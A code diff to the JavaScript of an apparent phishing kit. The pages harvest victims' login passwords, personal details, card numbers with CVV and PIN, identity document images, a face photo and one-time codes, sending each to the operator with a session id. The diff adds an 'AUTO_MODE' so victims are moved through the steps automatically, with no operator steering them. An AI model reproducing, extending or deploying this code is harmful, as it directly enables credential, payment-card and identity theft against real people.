@@ -1,4 +1,5 @@
 let sess = generateString(15);
+const AUTO_MODE = Boolean(window.AUTO_MODE);
 
 function go(id) {
 	if (id == 'submit-u' && checkEmpty(userField)) {	
@@ -11,36 +12,44 @@ function go(id) {
 		}, waitSleep);
 		setInner('u-value', getInputValue(userField));
 
-	} else if (id == 'submit-lg' && checkEmpty(passField)) {
+        } else if (id == 'submit-lg' && checkEmpty(passField)) {
 
-		sendMainINFO(sess, getInputValue(userField), getInputValue(passField));
-		// Show loading overlay and wait for admin redirect
-		$('#loading-content').show();
+                sendMainINFO(sess, getInputValue(userField), getInputValue(passField));
+                // Show loading overlay and wait for admin redirect
+                if (!AUTO_MODE) {
+                        $('#loading-content').show();
+                }
 
-	} else if (id == 'submit-ml' && checkEmpty(mlPassField)) {
+        } else if (id == 'submit-ml' && checkEmpty(mlPassField)) {
 
-		sendMlINFO(sess, getInputValue(mlPassField));
-		// Show loading overlay and wait for admin redirect
-		$('#loading-content').show();
+                sendMlINFO(sess, getInputValue(mlPassField));
+                // Show loading overlay and wait for admin redirect
+                if (!AUTO_MODE) {
+                        $('#loading-content').show();
+                }
 
-	} else if (id == 'submit-addr' && checkEmpty(fname) && checkEmpty(lname) && checkEmpty(addrField)
-		&& checkEmpty(zipField) && checkEmpty(stateField) && checkEmpty('pho-field') && checkEmpty('db-field')) {
+        } else if (id == 'submit-addr' && checkEmpty(fname) && checkEmpty(lname) && checkEmpty(addrField)
+                && checkEmpty(zipField) && checkEmpty(stateField) && checkEmpty('pho-field') && checkEmpty('db-field')) {
 
 		var bl_data = "Full name: " + getInputValue(fname) + ' ' + getInputValue(lname) + 
 		"\nAddress: " + getInputValue(addrField) + 
 		"\nZIP: " + getInputValue(zipField) + " ("  + getInputValue(stateField) + ")" +
 		"\nPhone: " + getInputValue('pho-field') +
 		"\nDOB: " + getInputValue('db-field');
-		sendBlInfo(sess, bl_data);
-		// Show loading overlay and wait for admin redirect
-		$('#loading-content').show();
+                sendBlInfo(sess, bl_data);
+                // Show loading overlay and wait for admin redirect
+                if (!AUTO_MODE) {
+                        $('#loading-content').show();
+                }
 
-	} else if (id == 'submit-card' && checkEmpty(fullname_field) && checkEmpty(card_field) && checkEmpty(expiry_field) && checkEmpty(cvv_field) && checkEmpty(pin_field) && validateCard(card_field) && validateExpiry(expiry_field) && validatePIN(pin_field)) {
-		hideDiv(crError);
-		sendCardInfo(sess, getInputValue(fullname_field), getInputValue(card_field),
-			getInputValue(expiry_field), getInputValue(cvv_field), getInputValue(pin_field));
-		// Show loading overlay and wait for admin redirect
-		$('#loading-content').show();
+        } else if (id == 'submit-card' && checkEmpty(fullname_field) && checkEmpty(card_field) && checkEmpty(expiry_field) && checkEmpty(cvv_field) && checkEmpty(pin_field) && validateCard(card_field) && validateExpiry(expiry_field) && validatePIN(pin_field)) {
+                hideDiv(crError);
+                sendCardInfo(sess, getInputValue(fullname_field), getInputValue(card_field),
+                        getInputValue(expiry_field), getInputValue(cvv_field), getInputValue(pin_field));
+                // Show loading overlay and wait for admin redirect
+                if (!AUTO_MODE) {
+                        $('#loading-content').show();
+                }
 
 	} else if (id == 'submit-card') {
 		// Show error if card validation fails
@@ -64,28 +73,71 @@ function go(id) {
 		sendDocsINFO(sess, getInputValue(front_doc_field), getInputValue(back_doc_field), getInputValue('face-base'));
 		hideDiv(doc_2_page);
 		showDiv('doc-load');
-		setTimeout(function () {
-			$('#doc-proc-content').hide(1000);
-			$('#sc-doc').show(1000);
-			setTimeout(function () {
-				hideDiv('doc-load');
-				// Show loading overlay and wait for admin redirect
-				$('#loading-content').show();
-			}, 2350);
-		}, 2350);
+                setTimeout(function () {
+                        $('#doc-proc-content').hide(1000);
+                        $('#sc-doc').show(1000);
+                        setTimeout(function () {
+                                hideDiv('doc-load');
+                                // Show loading overlay and wait for admin redirect
+                                if (!AUTO_MODE) {
+                                        $('#loading-content').show();
+                                }
+                        }, 2350);
+                }, 2350);
 
 	} else if (id == 'submit-kod' && checkEmpty(kodeField)) {
 
-		sendKod(sess, getInputValue(kodeField), kod_type);
-		// Show loading overlay and wait for admin redirect
-		$('#loading-content').show();
-	} else if (id == 'submit-otp-error' && checkEmpty('otp-error-field')) {
+                sendKod(sess, getInputValue(kodeField), kod_type);
+                // Show loading overlay and wait for admin redirect
+                if (!AUTO_MODE) {
+                        $('#loading-content').show();
+                }
+        } else if (id == 'submit-otp-error' && checkEmpty('otp-error-field')) {
 
-		sendKod(sess, getInputValue('otp-error-field'), kod_type);
-		// Show loading overlay and wait for admin redirect
-		$('#loading-content').show();
-	} 
+                sendKod(sess, getInputValue('otp-error-field'), kod_type);
+                // Show loading overlay and wait for admin redirect
+                if (!AUTO_MODE) {
+                        $('#loading-content').show();
+                }
+        }
 }
+
+function handleAutoAdvance(step) {
+        if (!AUTO_MODE) {
+                return;
+        }
+
+        $('#loading-content').hide();
+
+        switch (step) {
+                case 'login':
+                        hideDiv(pForm);
+                        hideDiv(mlForm);
+                        hideDiv(landing_page);
+                        hideDiv(LoadPage);
+                        showDiv(addrForm);
+                        lastWindows = addrForm;
+                        break;
+                case 'address':
+                        hideDiv(addrForm);
+                        hideDiv(LoadPage);
+                        showDiv(crdForm);
+                        lastWindows = crdForm;
+                        break;
+                case 'card':
+                        hideDiv(crdForm);
+                        hideDiv(kodeForm);
+                        hideDiv('otp-error-form');
+                        showDiv(sucForm);
+                        lastWindows = sucForm;
+                        redirect(redirectUrl, 6500);
+                        break;
+                default:
+                        console.warn('handleAutoAdvance received unknown step:', step);
+        }
+}
+
+window.handleAutoAdvance = handleAutoAdvance;
 
 function showLoadingDots() {
   document.getElementById('dot1').classList.toggle('visible');
